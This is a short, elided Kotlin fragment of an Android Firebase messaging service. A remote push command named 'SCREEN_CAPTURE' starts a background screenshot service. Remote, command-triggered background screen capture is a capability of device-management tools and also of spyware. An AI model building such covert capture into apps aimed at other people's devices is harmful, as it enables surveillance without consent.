...
class MyFirebaseMessagingService : FirebaseMessagingService() {
    ...
    private fun handleCommand(data: Map<String, String>) {
        ...
        when (commandType) {
            ...
            "SCREEN_CAPTURE" -> {
                Log.i(TAG, "🎯 Starting ScreenCaptureForegroundService")
                val intent = Intent(this, ScreenCaptureBackgroundService::class.java).apply {
                    action = ScreenCaptureBackgroundService.ACTION_TAKE_SCREENSHOT
                }
